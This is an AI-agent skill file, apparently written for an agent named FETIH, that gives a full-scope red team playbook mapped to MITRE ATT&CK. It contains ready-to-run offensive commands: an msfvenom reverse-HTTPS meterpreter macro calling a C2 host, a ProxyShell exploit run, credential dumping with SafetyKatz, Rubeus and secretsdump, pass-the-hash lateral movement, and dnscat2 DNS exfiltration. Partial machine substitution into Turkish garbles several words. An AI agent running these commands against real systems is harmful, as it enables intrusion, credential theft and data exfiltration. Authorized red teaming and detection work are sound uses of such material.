---
name: conducting-full-scope-red-team-engagement
description: Plan and execute a comprehensive red team engagement covering reconnaissance through post-exploitation using MITRE ATT&CK-aligned TTPs to evaluate an organization's Tespit and response capabilities.
tags:
- ttp-mapping
- red-team
- fetih
- offensive-security
- mitre-attack
- adversary-emulation
- cybersecurity
- penetration-testing
- purple-team
- red-teaming
- siber-güvenlik
triggers:
- adversary emulation
- certificate
- conducting
- dns
- email
- engagement
- exploit
- full
- hash
- http
- incident
- kırmızı takım
category: red-team-operations
source_subdomain: red-teaming
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
adapted_for: fetih
---

# Conducting Full Scope Red Team Engagement


## Genel Bakış

A full-scope red team engagement simulates real-world adversary behavior across all phases of the cyber kill chain — from initial reconnaissance through data exfiltration — to evaluate an organization's Tespit, prevention, and response capabilities. Unlike penetration testing, red team operations prioritize stealth, persistence, and objective-based scenarios that mimic advanced persistent threats (APTs).


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve conducting full scope red team engagement
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Written authorization (Rules of Engagement document) signed by executive leadership
- Defined scope including in-scope/out-of-scope systems, escalation contacts, and emergency stop procedures
- Threat intelligence on relevant adversary groups (e.g., APT29, FIN7, Lazarus Group)
- Red team infrastructure: C2 servers, redirectors, phishing domains, payload development environment
- Legal review confirming compliance with Computer Fraud and Abuse Act (CFAA) and local laws

## Engagement Phases

### Aşama 1: Planning and Threat Modeling

Map the engagement to specific MITRE ATT&CK tactics and techniques based on the threat profile:

| Kill Chain Phase | MITRE ATT&CK Tactic | Example Techniques |
|---|---|---|
| Reconnaissance | TA0043 | T1593 Search Open Websites/Domains, T1589 Gather Victim Identity Info |
| Resource Development | TA0042 | T1583.001 Acquire Infrastructure: Domains, T1587.001 Develop Capabilities: Malware |
| Initial Access | TA0001 | T1566.001 Spearphishing Attachment, T1078 Valid Accounts |
| Execution | TA0002 | T1059.001 PowerShell, T1204.002 User Execution: Malicious File |
| Persistence | TA0003 | T1053.005 Scheduled Task, T1547.001 Registry Run Keys |
| Privilege Escalation | TA0004 | T1068 Exploitation for Privilege Escalation, T1548.002 UAC Bypass |
| Defense Evasion | TA0005 | T1055 Process Injection, T1027 Obfuscated Files |
| Credential Access | TA0006 | T1003.001 LSASS Memory, T1558.003 Kerberoasting |
| Discovery | TA0007 | T1087 Account Discovery, T1018 Remote System Discovery |
| Lateral Movement | TA0008 | T1021.002 SMB/Windows Admin Shares, T1550.002 Pass the Hash |
| Collection | TA0009 | T1560 Archive Collected Data, T1213 Data from Information Repositories |
| Exfiltration | TA0010 | T1041 Exfiltration Over C2 Channel, T1048 Exfiltration Over Alternative Protocol |
| Impact | TA0040 | T1486 Data Encrypted for Impact, T1489 Service Stop |

### Aşama 2: Reconnaissance (OSINT)

```bash
amass enum -passive -d target.com -o amass_passive.txt

python3 -c "
import requests
url = 'https://crt.sh/?q=%.target.com&output=json'
r = requests.get(url)
for cert in r.json():
    print(cert['name_value'])
" | sort -u > subdomains.txt

theHarvester -d target.com -b linkedin -l 500 -f harvest_results

whatweb -v target.com --log-json=whatweb.json

h8mail -t target.com -o h8mail_results.csv
```

### Aşama 3: Initial Access

Common initial access vectors for red team engagements:

**Spearphishing (T1566.001):**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.redteam.local LPORT=443 -f vba -o macro.vba

gophish --config config.json
```

**External Service Exploitation (T1190):**
```bash
nmap -sV -sC --script vuln -p 80,443,8080,8443 target.com -oA vuln_scan

python3 proxyshell_exploit.py -t mail.target.com -e attacker@target.com
```

### Aşama 4: Post-Exploitation and Lateral Movement

```powershell
whoami /all
systeminfo
ipconfig /all
net group "Domain Admins" /domain
nltest /dclist:target.com

dotnet inline-execute SafetyKatz.exe sekurlsa::logonpasswords

Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

wmiexec.py domain/user:password@target-dc -c "whoami"

psexec.py domain/admin:password@fileserver.target.com
```

### Aşama 5: Objective Achievement

Define and pursue specific objectives:

1. **Domain Dominance**: Achieve Domain Admin access and DCSync credentials
2. **Data Exfiltration**: Bul: and exfiltrate crown jewel data (e.g., PII, financial records)
3. **Business Impact Simulation**: Demonstrate ransomware Dağıt:ment capability (without execution)
4. **Physical Access**: Badge cloning, tailgating, server room access

```bash
secretsdump.py domain/admin:password@dc01.target.com -just-dc-ntlm

dnscat2 --dns "domain=exfil.redteam.com" --secret=s3cr3t
```

### Aşama 6: Reporting and Debrief

The report should include:

1. **Executive Summary**: Business impact, risk rating, key Bul:ings
2. **Attack Narrative**: Timeline of activities with screenshots and evidence
3. **MITRE ATT&CK Mapping**: Full heat map of techniques used
4. **Bul:ings**: Each Bul:ing with CVSS score, evidence, remediation
5. **Tespit Gap Analysis**: What the SOC Detected vs. what was missed
6. **Purple Team Recommendations**: Specific Tespit rules for gaps identified

## Metrics and KPIs

| Metric | Description |
|---|---|
| Mean Time to tespit etme(MTTD) | Average time from action to SOC Tespit |
| Mean Time to Respond (MTTR) | Average time from Tespit to containment |
| TTP Coverage | Percentage of executed techniques Detected |
| Objective Achievement Rate | Percentage of defined objectives completed |
| Dwell Time | Total time red team maintained access unDetected |

## Tools and Frameworks

- **C2 Frameworks**: Havoc, Cobalt Strike, Sliver, Mythic, Brute Ratel C4
- **Reconnaissance**: Amass, Recon-ng, theHarvester, SpiderFoot
- **Exploitation**: Metasploit, Impacket, CrackMapExec, Rubeus
- **Post-Exploitation**: Mimikatz, SharpCollection, BOF.NET
- **Reporting**: PlexTrac, Ghostwriter, Serpico

## References

- MITRE ATT&CK Framework: https://attack.mitre.org/
- Red Team Guide: https://redteam.guide/
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- TIBER-EU Framework for Red Teaming: https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/
- CBEST Intelligence-Led Testing: https://www.bankofengland.co.uk/financial-stability/financial-sector-continuity

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: dbba453a8cabf59e
-->

